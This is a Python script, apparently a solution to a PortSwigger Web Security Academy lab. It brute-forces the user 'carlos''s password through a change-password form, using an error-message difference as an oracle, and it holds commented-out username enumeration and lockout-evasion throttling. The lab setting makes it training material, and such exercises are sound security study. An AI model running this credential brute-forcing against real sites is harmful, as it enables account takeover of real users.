import requests
import urllib
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

URl = 'https://0afd00d1033c7fa8c25eb26d00d600a2.web-security-academy.net/my-account/change-password'
URL = 'https://0afd00d1033c7fa8c25eb26d00d600a2.web-security-academy.net/login'
Cookies = {'session' : 'jPgLBAoPIdoYdQeMEdTqTMHOpk8CoF7H'}
username_file = open("username.txt", "r")
password_file = open("password.txt", "r")

def getusername_and_password(file, file1):
    # for username in file.readlines() :
    #     username = username.strip("\n")
    #     data1 = {'username' : username, 'password' : '123'}
    #     for i in range(5):
    #         r = requests.post(URl, data=data1, verify=False, proxies=proxies)
    #     if 'Invalid username or password.' in r.text:
    #         print("Currently at %s username..." %username)
    #     else:
    #         valid_username = username
    #         print("Found! %s is a valid username!" %username)
    #         break
    valid_username = 'carlos'
    # i = 1
    # data2 = {'username' : 'wiener', 'password' : 'peter'}
    # session = requests.Session()
    # r = session.post(URL, data=data2, verify=False, proxies=proxies)
    # Cookies = session.cookies.get_dict()
    Cookies = {'session' : 'MpHIOZqea5pmAfXmRHICcWXl7AQiQBJe'}
    for password in file1.readlines():
        password = password.strip("\n")
        data2 = {'username' : valid_username, 'current-password' : password, 'new-password-1' : '123', 'new-password-2' : '12'}
        r = requests.post(URl, data=data2, verify=False, proxies=proxies, cookies=Cookies)
        if 'New passwords do not match' not in r.text:
            print("Currently at %s password..." %password)
            # i += 1
        else:
            print("Found! %s is a valid password for %s!" % (password,valid_username))
            break
        # if i % 3 == 0:
        #     time.sleep(60)
        #     i += 1

getusername_and_password(username_file, password_file)